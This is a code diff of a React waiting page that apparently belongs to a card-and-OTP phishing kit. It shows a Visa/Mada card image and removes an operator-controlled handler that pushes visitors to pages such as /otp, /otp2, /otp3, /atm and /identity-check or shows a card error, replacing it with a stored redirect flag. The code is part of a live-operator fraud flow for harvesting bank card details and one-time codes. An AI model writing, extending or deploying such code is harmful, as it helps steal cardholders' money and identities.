@@ -1,62 +1,22 @@
-import { useState, useCallback } from "react";
+import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { Header } from "@/components/layout/Header";
 import { Loader2, AlertCircle } from "lucide-react";
 import { motion } from "framer-motion";
 import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";
-import { useSSE, type SSEMessage } from "@/hooks/useSSE";
 
 export default function WaitingPage() {
   const [, setLocation] = useLocation();
   const [errorType, setErrorType] = useState<string | null>(null);
   
-  // Get sessionId on mount
-  const sessionId = localStorage.getItem("sessionId");
-  
-  // Map actions to pages
-  const pageMap: Record<string, string> = {
-    go_home: "/",
-    go_form: "/form",
-    go_select: "/select",
-    go_visa: "/visa",
-    go_otp: "/otp",
-    go_otp2: "/otp2",
-    go_otp3: "/otp3",
-    go_atm: "/atm",
-    go_nomer: "/nomer",
-    go_nomer_wait: "/nomer-wait",
-    go_nomer_otp: "/nomer-otp",
-    go_identity_check: "/identity-check",
-    go_total: "/total",
-    go_total2: "/total2",
-    go_waiting: "/waiting",
-  };
-  
-  // Handle control action from SSE
-  const handleControl = useCallback((message: SSEMessage) => {
-    console.log("[WaitingPage] Received control:", message.action);
-    
-    // Handle card error
-    if (message.action === "card_error") {
-      console.log("[WaitingPage] Showing card error");
+  // Check for error from global redirect (card_error)
+  useEffect(() => {
+    const storedError = localStorage.getItem("redirectError");
+    if (storedError === "card_error") {
       setErrorType("card_error");
-      return;
+      localStorage.removeItem("redirectError");
     }
-    
-    // Handle redirect actions
-    const targetPage = pageMap[message.action];
-    if (targetPage) {
-      console.log("[WaitingPage] Redirecting to:", targetPage);
-      // Navigate to target page
-      setLocation(targetPage);
-    }
-  }, [pageMap, setLocation]);
-  
-  // Use SSE for real-time connection
-  const { isConnected } = useSSE({
-    sessionId: sessionId || "",
-    onControl: handleControl,
-  });
+  }, []);
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
